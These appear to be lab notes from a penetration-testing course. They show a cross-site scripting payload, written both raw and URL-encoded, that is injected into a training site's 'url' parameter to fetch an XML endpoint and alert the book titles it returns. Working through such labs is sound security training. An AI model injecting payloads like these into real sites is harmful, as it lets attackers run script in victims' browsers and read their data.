XHR and XML Parsing

**********************************************************************************************************************************

Sample XML File (books.xml)

http://msdn.microsoft.com/en-us/library/ms762271(v=vs.85).aspx

**********************************************************************************************************************************

Walkthrough

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml?url=333
http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml/data

Before encoding :-
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            titles = req.responseXML.getElementsByTagName("title");
			      alert(titles.length);
        }

    };

    req.open("GET", "/lab/webapp/jfp/xml/data", true);
    req.send();
</script>

After encoding :-
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20titles%20%3D%20req.responseXML.getElementsByTagName(%22title%22)%3B%0A%09%09%09alert(titles.length)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxml%2Fdata%22%2C%20true)%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20titles%20%3D%20req.responseXML.getElementsByTagName%28%22title%22%29%3B%0A%09%09%09alert%28titles.length%29%3B%0A%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxml%2Fdata%22%2C%20true%29%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

Before encoding :-
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            titles = req.responseXML.getElementsByTagName("title");
            for (i = 0; i < titles.length; i++) {
                alert(titles[i].childNodes[0].nodeValue);
            }
        }

    };

    req.open("GET", "/lab/webapp/jfp/xml/data", true);
    req.send();
</script>

After encoding :-
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20titles%20%3D%20req.responseXML.getElementsByTagName(%22title%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20(i%20%3D%200%3B%20i%20%3C%20titles.length%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert(titles%5Bi%5D.childNodes%5B0%5D.nodeValue)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxml%2Fdata%22%2C%20true)%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20titles%20%3D%20req.responseXML.getElementsByTagName%28%22title%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20%28i%20%3D%200%3B%20i%20%3C%20titles.length%3B%20i%2B%2B%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert%28titles[i].childNodes[0].nodeValue%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20}%0A%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxml%2Fdata%22%2C%20true%29%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

**********************************************************************************************************************************
